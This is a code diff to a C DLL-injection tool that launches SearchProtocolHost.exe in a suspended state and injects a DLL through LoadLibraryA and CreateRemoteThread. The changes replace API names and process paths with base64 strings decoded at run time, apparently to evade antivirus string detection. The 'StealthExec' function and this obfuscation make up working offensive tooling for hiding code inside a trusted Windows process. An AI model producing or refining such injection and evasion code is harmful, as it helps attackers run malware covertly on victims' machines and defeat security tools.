@@ -13,7 +13,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     NTSTATUS status;
 
     // Resolve Required Functions
-    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");
+    pMod pLLoad = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB")); // "LoadLibraryA"
 
     if (!pLLoad)
     {
@@ -54,16 +54,16 @@ void StealthExec(HANDLE hProc, const char *dllN)
         myDebug(DEBUG_SUCCESS, "Successfully write memory.");
     }
 
-    pMod pCRT = GetMod("kernel32.dll", "CreateRemoteThreadEx");
+    pMod pCRT = GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUmVtb3RlVGhyZWFk")); //"CreateRemoteThread"
 
     if (!pCRT)
     {
-        myDebug(DEBUG_ERROR, "Failed to resolve CreateRemoteThreadEx.");
+        myDebug(DEBUG_ERROR, "Failed to resolve CreateRemoteThread.");
         return;
     }
     else
     {
-        myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThreadEx.");
+        myDebug(DEBUG_SUCCESS, "Successfully resolve CreateRemoteThread.");
     }
 
     // Load Remote DLL
@@ -114,19 +114,18 @@ int main(int argc, char *argv[])
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
 
-    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
-    const char *procName = "SearchProtocolHost.exe";
-    // Also work with explorer.exe
-    // const char* procPath = "C:\\Windows\\explorer.exe";
-    // const char *procName = "Explorer.exe";
+    // "C:\\Windows\\System32\\SearchProtocolHost.exe"
+    const char *procPath = "QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxTZWFyY2hQcm90b2NvbEhvc3QuZXhl";
+    // SearchProtocolHost.exe
+    const char *procName = "U2VhcmNoUHJvdG9jb2xIb3N0LmV4ZQ==";
 
-    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
+    if (!CreateProcessA(Bsfd(procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
         myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
         return -1;
     }
 
-    myDebug(DEBUG_INFO, "Suspended %s created.", procName);
+    myDebug(DEBUG_INFO, "Suspended %s created.", Bsfd(procName));
 
     // Perform Injection
     StealthExec(pInfo.hProcess, dllPath);
@@ -135,7 +134,7 @@ int main(int argc, char *argv[])
     ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
     CloseHandle(pInfo.hThread);
-    myDebug(DEBUG_INFO, "%s is now running.", procName);
+    myDebug(DEBUG_INFO, "%s is now running.", Bsfd(procName));
 
     return 0;
 }
